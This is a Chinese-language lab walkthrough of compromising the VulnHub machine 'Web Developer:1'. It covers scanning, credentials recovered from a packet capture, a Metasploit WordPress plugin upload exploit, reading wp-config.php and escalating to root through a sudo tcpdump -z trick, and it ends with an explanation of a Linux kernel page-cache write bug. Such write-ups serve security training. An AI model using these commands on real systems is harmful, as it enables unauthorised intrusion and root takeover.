---
title: "Vulnhub靶机实战：Web Developer:1"
category: Web-靶场实战
description: "对靶机Web Developer:1进行的一次渗透测试。"
published: 2026-11-26
tags: [Web, Vulnhub, 靶场实战]
---
**一、靶机基本信息**
靶机名称：Web Developer:1
难度等级：入门级
官方来源：VulnHub 官方站点（https://www.vulnhub.com/ ）
渗透目标：获取靶机Web Developer 文件/root/flag.txt中flag。

**二、实验环境**
攻击机：Kali Linux
靶机：Web Developer:1（同网段虚拟机）
网络模式：VMware NAT 模式
核心工具：netdiscover、nmap、dirb、metasploit等

**三、实验步骤**
**1、发现目标 (netdiscover)，找到靶机的IP地址**
```
sudo netdiscover -r 192.168.xxx.0/24
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/f95a2f846740f799063cb91ee537166e-yank-note-picgo-img-20261127105550.png)

**2、利用NMAP扫描目标主机**
```
nmap -sV 192.168.xxx.134
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/fdcd3dca755b2aef1b778d920dc459ef-yank-note-picgo-img-20261127105623.png)
发现80端口开放。

**3、尝试利用浏览器访问目标网站**
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/31138966320482a4a1ea85bd3712d692-yank-note-picgo-img-20261127105824.png)
可以发现目标网站使用了WordPress模板，有一个Log in登录界面。

**4、探测目标网站使用的CMS模板**
```
whatweb 192.168.xxx.134
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/ead9d12a998953787e7885e860a48c7a-yank-note-picgo-img-20261127105916.png)
其使用的CMS为WordPress 4.9.8。
```
wpscan简介：
WPScan 是一款专门针对 WordPress 网站的黑盒安全扫描器，核心功能是识别 WordPress 核心、插件及主题中存在的已知漏洞与安全配置问题。
核心功能：
版本与组件检测：识别目标 WordPress 的核心版本、已安装的插件与主题。自 4.0 版本起，默认仅扫描核心版本与活动主题，需通过 -e 参数显式指定才会枚举插件。
漏洞比对：将检测到的组件版本与 WPScan 漏洞数据库（收录超 9 万个漏洞）进行比对。注意：要获取具体的漏洞详情，通常需要配置免费的 WPScan API Token。
用户枚举：通过作者 ID 扫描、登录错误信息等方式，尝试发现网站上的有效用户名。
密码暴力破解：针对已发现的用户名，使用字典文件对 WordPress 登录页面进行密码猜测攻击（仅限授权测试）。
敏感文件与备份检查：探测公开可访问的备份文件（如 wp-config.php 备份）、数据库导出文件或暴露的错误日志。
精确认证扫描：提供 --wp-auth 选项，允许使用 WordPress 应用程序密码直接查询 REST API，从而获取最准确的插件与主题清单，避免传统指纹识别的误报。
此外，它还支持 JSON 等格式输出结果，便于集成到自动化安全流程中。
```

**5、使用 Dirb 爆破网站目录**
```
dirb 192.168.xxx.134
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/4450ef4b2803dad675d4e3b0ea7fdd77-yank-note-picgo-img-20261127110204.png)
找到了似乎和网络流量有关的目录（路径）：192.168.xxx.134/ipdata

**6、浏览器访问该目录（路径）**
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/36658014a49a055379b3648ce627d92b-yank-note-picgo-img-20261127110313.png)
发现一个cap文件。
```
文件后缀.cap 代表 Packet Capture（数据包捕获），这是网络流量分析中最标准的文件格式（通常由 Wireshark、tcpdump 等工具生成）。
```

**7、利用Wireshark分析该数据包，分析TCP数据流**
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/b3b4b8c791ae98d5f78363811ad99fe0-yank-note-picgo-img-20261127110503.png)
发现操作系统账号密码，进行解码：
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/4c668d28f64a030692e018254486d883-yank-note-picgo-img-20261127110530.png)

**8、利用上一步得到的信息进入网站后台**
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/63cdba887a3aa744e8eca08817c2c6b5-yank-note-picgo-img-20261127110606.png)

**9、利用该CMS存在的（插件Plugin）漏洞提权**
利用MeterSploit插件+reflex gallery插件漏洞实现。
```
msfconsole  # 启动Metasploit
use exploit/unix/webapp/wp_reflexgallery_file_upload
set rhosts 192.168.xxx.134
exploit
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/c768071f42e5e82536793c0496028a29-yank-note-picgo-img-20261127110709.png)
建立会话后，查看wp-config.php获得账号及口令。
```
shell
pwd
cd /var/www/html
ls -la
cat wp-config.php
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/c604b4c7184a277ed3d5f935affd25d2-yank-note-picgo-img-20261127110723.png)
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/384ac513156c887f48201dbd7a405de9-yank-note-picgo-img-20261127110730.png)

**10、SSH登录服务器**
```
ssh webdeveloper@192.168.xxx.134
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/068169e3fefa98715aa46e4887d93bf7-yank-note-picgo-img-20261127111406.png)

**11、尝试查看/root/flag.txt** 
```
(sudo) cat /root/flag.txt
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/1ae86112c45ad30038eec2833ba2f977-yank-note-picgo-img-20261127111504.png)
均无法查看。

**12、查看当前用户的 sudo 权限配置**
```
sudo -l
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/61df027b2a519fcf566dc3041e61b580-yank-note-picgo-img-20261127111701.png)
发现可以以root身份执行tcpdump命令。

**13、使用tcpdump执行任意命令**
创建攻击文件，写入shellcode，赋予可执行权限，利用tcpdump执行任意命令，获得flag。
```
touch /tmp/exploit1
echo 'cat /root/flag.txt' > /tmp/exploit1
chmod +x /tmp/exploit1
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit1 -Z root
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/78a94785e59f4ac822a4f9071d3e0630-yank-note-picgo-img-20261127111851.png)

```
tcpdump命令详解：
-i eth0 从指定网卡捕获数据包
-w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果）
-z [command] 运行指定的命令
-Z [user] 指定用户执行命令
-G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储
-W [num] 指定抓包数量
```

**(拓展)14、修改靶机root账号的密码**
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/1203811cb016255527f753f04a84535c-yank-note-picgo-img-20261127112405.png)
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/9c4fdf1c07dfae74e86f8a3995398836-yank-note-picgo-img-20261127112327.png)
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/81b49d859a5b67556a3dc9ddf7a38dba-yank-note-picgo-img-20261127112336.png)
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/27/df5a9da2a5f8451cdd9f411b4aec57c5-yank-note-picgo-img-20261127112345.png)
```
注释：
|: 管道符号，把前面 echo 输出的文字，传给后面的命令
chpasswd：Linux 自带非交互改密码工具，专门接收 用户:密码 这种格式输入，直接写入 /etc/shadow，修改账户密码
```

**四、实验方法拓展：Copy Fail漏洞的利用**
Copy Fail（CVE-2026-31431）：它是 Linux 内核 AF_ALG/AEAD 加密套接字路径里的一个逻辑漏洞，最终给出一个非常「干净」的原语：
```
对任意可读文件的页缓存（内存副本），做确定性的、无竞态的 4 字节写入，位置和值都可控，且不修改磁盘上的文件。
```

**三个缺陷如何叠加**
原地解密：crypto/algif_aead.c 的 _aead_recvmsg() 解密时把 req->src = req->dst，并用 sg_chain() 把请求的 tag 页链进「可写的目标 scatterlist」。

零拷贝 splice：splice(文件 → pipe → AF_ALG 套接字) 不走内存拷贝，直接把任意可读文件的页缓存页喂进加密输入/tag 区域。

authencesn 的草稿纸越界写：crypto/authencesn.c 把目标 scatterlist 当临时草稿，在校验 tag 之前写了 4 字节超出约定边界：
```
c
scatterwalk_map_and_copy(tmp,    dst, 0, 8, 0);
scatterwalk_map_and_copy(tmp,    dst, 4, 4, 1);
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // ← 越界 4 字节
```
最后一行把 seqno_lo（= 攻击者可控的 AAD 字节 4..7）写到 dst[assoclen+cryptlen]，正好落到选中文件的偏移上。

**利用方法详见文章"CVE-2026-31431：Copy Fail漏洞简单化说明"。**